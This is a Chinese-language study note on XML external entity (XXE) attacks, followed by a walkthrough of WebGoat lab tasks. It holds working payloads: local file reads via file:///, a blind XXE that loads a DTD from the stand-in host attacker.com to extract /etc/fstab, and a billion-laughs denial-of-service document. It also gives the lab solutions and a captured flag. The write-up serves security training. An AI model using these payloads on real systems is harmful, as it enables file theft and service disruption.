# XEE
XML 外部实体攻击。

* Classic 包含一个本地文件
* Blind 返回中没有显示输出或者错误
* Error 尝试从错误页面获取信息。

参考：

[https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/](https://www.acunetix.com/blog/articles/xml-external-entity-xxe-vulnerabilities/)

```
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
  <!ELEMENT author (#PCDATA)>
  <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```
一般利用引入属性来解决问题。比如：

``` xml
<!DOCTYPE user
    [<!ENTITY root SYSTEM "file:///">
]>
```

但是有时候目标文件有 <>&, 等非法 XML 字符无法被直接嵌入。需要盲 XXE。方法就在自己服务器上上传一个 dtd 文件，而后利用属性实体进行导入。

比如：

```
<!ENTITY % file SYSTEM "file:///etc/fstab">
<!ENTITY % start "<![CDATA[">
<!ENTITY % end "]]>">
<!ENTITY % all "<!ENTITY fileContents
'%start;%file;%end;'>">
```

``` xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM
  "http://attacker.com/evil.dtd">
  %dtd;
  %all;
]>
<data>&fileContents;</data>
```

## DOS 攻击

也可以利用 XXE 进行攻击。比如:

```XML
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

## Task1

直接使用:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE copyright [<!ENTITY test SYSTEM "file:///">]>
<comment><text>hello&test;</text></comment>
```

即可。

## Task2

发现服务器可以识别 xml。将 content-type 修改成 application/xml 后上传上题 xml 即可。

## Task3

Blind XXE。利用 `Python -m http.server` 上传了本地文件 task.dtd 而后构造攻击 xml 为
```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE copyright [
  <!ENTITY % dtd SYSTEM
  "http://192.168.122.1:2000/task.dtd">
  %dtd;
  %all;
]>
<comment><text>&fileContents;</text></comment>
```

获得 flag 为 `WebGoat 8.0 rocks... (jbNnHGDMUM)`
